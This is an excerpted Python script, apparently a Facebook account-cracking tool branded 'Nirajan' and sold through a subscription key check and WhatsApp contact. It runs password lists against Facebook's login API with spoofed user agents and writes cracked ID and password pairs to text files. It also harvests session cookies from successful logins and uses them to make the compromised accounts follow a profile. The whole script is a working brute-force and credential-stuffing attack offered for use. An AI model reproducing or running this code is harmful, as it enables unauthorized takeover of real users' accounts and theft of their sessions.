...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[ Nirajan ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ Nirajan-CP ] {idf} | {pw}')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ Nirajan-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Nirajan-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
logo = ("""\033[1;32m 
 \033[1;32m 
\033[1;32m _   _ ___________  ___     ___  ___   _   _ 
\033[1;35m | \ | |_   _| ___ \/ _ \   |_  |/ _ \ | \ | |
\033[1;33m |  \| | | | | |_/ / /_\ \    | / /_\ \|  \| |
\033[1;37m | . ` | | | |    /|  _  |    | |  _  || . ` |
\033[1;31m | |\  |_| |_| |\ \| | | |/\__/ / | | || |\  |
\033[1;34m \_| \_/\___/\_| \_\_| |_/\____/\_| |_/\_| \_/
...
\033[1;32mName  一Nɩʀʌjʌŋཐི༏ཋྀ
        
 
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
  \033[1;32mAuther  : NIRAJAN
  \033[1;33mYouTube : Net YTZ
  \033[1;32mFecbook :  一Nɩʀʌjʌŋཐི༏ཋྀ
   \033[1;33m Admin. : NIRAJAN
   \033[1;33m WhatsApp:9704151844
   \033[1:Country:Nepla
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
...
class Main:
	def __init__(self):
		...
		if NIKESH in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/profile.php?id=100092036285816")
			print("")
			time.sleep(2.0)
			print("\033[1;33m    NIRAJAN")
			print("")
  ...
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("2009-NIrajan-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
  ...
  "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		...
		sys.stdout.write(
			"\r [ Nirajan ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ Nirajan-OK ] %s | %s\033[0;97m         "%(uid, pw))
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/netlessturitol/APPROVAL/blob/main/approve.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		os.system('am start https://wa.me/+9779704151844?text=' + tks)
		Subscraption()        
Subscraption()
